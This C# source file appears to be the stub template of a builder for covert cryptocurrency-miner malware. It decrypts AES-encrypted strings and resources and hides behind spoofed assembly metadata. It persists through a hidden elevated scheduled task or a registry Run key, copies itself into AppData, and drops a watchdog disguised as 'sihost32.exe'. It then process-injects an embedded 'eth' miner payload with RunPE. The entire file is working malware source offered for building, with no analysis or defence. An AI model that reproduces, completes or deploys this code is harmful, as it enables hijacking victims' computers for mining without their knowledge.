using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: Guid("%Guid%")]
#endif

public partial class Program
{
    public static string lb = RGetString("#LIBSPATH");
    public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb;
#if DefInstall
    public static string plp = PayloadPath;
#endif

    public static void Main()
    {
#if DefInstall
        try{
            Thread.Sleep(2 * 1000);
            if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                try{
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(plp) + "\"" + " /tr " + "'" + "\"" + (plp) + "\"" + "' & exit",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        Verb = "runas"
                    });
                }
                catch(Exception ex){
                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(plp), plp);
#if DefDebug
                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
#endif
                }
            }else{
                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(plp), plp);
            }
        }
        catch(Exception ex){
#if DefDebug
            MessageBox.Show("M2: " +ex.ToString());
#endif
        }
        RInstall();
#endif
        try
        {
            RInitialize();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0: " +ex.ToString());
#endif
        }
    }

#if DefInstall
    public static void RInstall()
    {
        Thread.Sleep(2 * 1000);
        if (Process.GetCurrentProcess().MainModule.FileName != plp)
        {
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, plp, true);
            Thread.Sleep(5 * 1000);
            RBaseFolder();
            Process.Start(new ProcessStartInfo
            {
                FileName = plp,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
            Environment.Exit(0);
        }
    }
#endif

    public static byte[] RGetTheResource(string rarg1)
    {
        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
        return RAES_Decryptor((byte[])MyResource.GetObject(rarg1));
    }

    public static string RGetString(string rarg1)
    {
        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(rarg1)));
    }

    public static void RRun(byte[] rarg1, string rarg2, byte[] rarg3)
    {
        // Credits gigajew for RunPE https://github.com/gigajew/Mandark
        Assembly.Load(rarg1).GetType(RGetString("#DLLSTR")).GetMethod(RGetString("#DLLOAD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { rarg3, ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), rarg2 });
    }

    public static void RBaseFolder()
    {
        try
        {
            Directory.CreateDirectory(bD);

#if DefWatchdog
            foreach (Process proc in Process.GetProcessesByName("sihost32"))
            {
                proc.Kill();
            }

            Thread.Sleep(3000);
            File.WriteAllBytes(bD + "sihost32.exe", RGetTheResource("#watchdog"));

            Thread.Sleep(1 * 1000);

            if (Process.GetProcessesByName("sihost32").Length < 1)
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = bD + "sihost32.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                });
            }
#endif

        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static bool RCheckProc()
    {
        try
        {
            var options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
            scope.Connect();

            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
            var query = new ObjectQuery(wmiQuery);
            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
            var managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject retObject in managementObjectCollection)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-e"))
                {
                    return true;
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M4: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }

    public static void RInitialize()
    {
        try
        {
            RBaseFolder();

            string argstr = RGetString("#ARGSTR");
            argstr = argstr.Replace("{%RANDOM%}", RTruncate("R" + Guid.NewGuid().ToString().Replace("-", ""), 10));
            argstr = argstr.Replace("{%COMPUTERNAME%}", RTruncate("C" + System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""), 10));
            if (RCheckProc())
            {
                Environment.Exit(0);
            }

            try
            {
                using (var archive = new ZipArchive(new MemoryStream(RGetTheResource("#eth"))))
                {
                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        if (entry.FullName.Contains("et"))
                        {
                            using (var streamdata = entry.Open())
                            {
                                using (var ms = new MemoryStream())
                                {
                                    streamdata.CopyTo(ms);
                                    RRun(RGetTheResource("#dll"), argstr, ms.ToArray());
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
#if DefDebug
            MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
#endif
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static string RTruncate(string rarg1, int rarg2)
    {
        if (string.IsNullOrEmpty(rarg1))
        {
            return rarg1;
        }
        return rarg1.Length > rarg2 ? rarg1.Substring(0, rarg2) : rarg1;
    }

    public static byte[] RAES_Decryptor(byte[] rarg1)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
            {
                cStream.Write(rarg1, 0, rarg1.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }
}